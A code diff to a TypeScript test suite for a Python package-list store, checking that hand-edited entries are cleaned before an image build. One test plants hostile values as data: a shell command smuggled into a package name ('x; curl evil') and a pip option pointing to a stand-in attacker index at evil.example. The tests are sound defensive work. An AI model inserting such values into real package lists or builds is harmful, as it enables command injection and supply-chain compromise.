@@ -1,4 +1,4 @@
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import {
@@ -53,11 +53,18 @@ describe('createPythonPackagesPort', () => {
     expect(await port.update({ add: [], remove: [] })).toEqual([]);
     expect(await port.update({ add: ['feedparser', 'arxiv'], remove: [] })).toEqual(['feedparser', 'arxiv']);
     expect(await createPythonPackagesPort({ dir }).update({ add: [], remove: ['arxiv'] })).toEqual(['feedparser']);
-    expect(JSON.parse(readFileSync(join(dir, 'python-packages.json'), 'utf8'))).toEqual(['feedparser']);
+    expect(readFileSync(join(dir, 'python-packages.txt'), 'utf8')).toBe('feedparser\n');
   });
 
-  test('drops a hand-edited entry that is not a plain package name', async () => {
-    writeFileSync(join(dir, 'python-packages.json'), JSON.stringify(['feedparser', 'x; curl evil', 3]));
+  test('rewrites a hand-edited file so only plain package names reach the image build', async () => {
+    const file = join(dir, 'python-packages.txt');
+    writeFileSync(file, 'feedparser\n--index-url https://evil.example/simple\n-e git+https://x/y\nx; curl evil\n');
     expect(await createPythonPackagesPort({ dir }).update({ add: [], remove: [] })).toEqual(['feedparser']);
+    expect(readFileSync(file, 'utf8')).toBe('feedparser\n');
+  });
+
+  test('writes nothing when there is no list and nothing is asked', async () => {
+    expect(await createPythonPackagesPort({ dir }).update({ add: [], remove: [] })).toEqual([]);
+    expect(existsSync(join(dir, 'python-packages.txt'))).toBe(false);
   });
 });
